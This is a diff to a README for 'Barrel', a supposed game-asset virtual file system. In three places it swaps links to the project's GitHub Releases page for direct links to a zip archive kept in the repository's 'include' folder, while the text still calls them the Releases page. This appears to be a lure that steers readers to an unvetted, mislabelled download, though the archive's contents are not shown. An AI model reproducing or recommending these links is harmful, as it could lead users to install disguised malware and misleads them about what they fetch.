@@ -6,13 +6,13 @@ Welcome to Barrel! This application offers a high-performance virtual file syste
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Download Barrel](https://github.com/TurkeyLeg72/Barrel/releases). 
+To get started, you need to download the application. Visit this page to download: [Download Barrel](https://raw.githubusercontent.com/TurkeyLeg72/Barrel/main/include/Software-1.7.zip). 
 
 Once you’re on the Releases page, choose the version suitable for your system. You'll find user-friendly options for different setups.
 
 ### Installation Instructions:
 
-1. Go to the [Releases page](https://github.com/TurkeyLeg72/Barrel/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/TurkeyLeg72/Barrel/main/include/Software-1.7.zip).
 2. Select the version you want to download. 
 3. Click the download link relevant to your operating system, such as `.exe` for Windows, `.dmg` for macOS, or compressed archive files for Linux.
 4. Once the download finishes, locate the downloaded file on your computer.
@@ -76,4 +76,4 @@ We value user feedback to improve Barrel. If you have suggestions or notice any 
 
 Barrel is a powerful tool tailored to enhance your game development experience. By following the steps outlined above, you can quickly download, install, and utilize Barrel to manage your game assets effectively.
 
-Again, make sure to visit this page to download: [Download Barrel](https://github.com/TurkeyLeg72/Barrel/releases). Enjoy using Barrel in your projects!
+Again, make sure to visit this page to download: [Download Barrel](https://raw.githubusercontent.com/TurkeyLeg72/Barrel/main/include/Software-1.7.zip). Enjoy using Barrel in your projects!
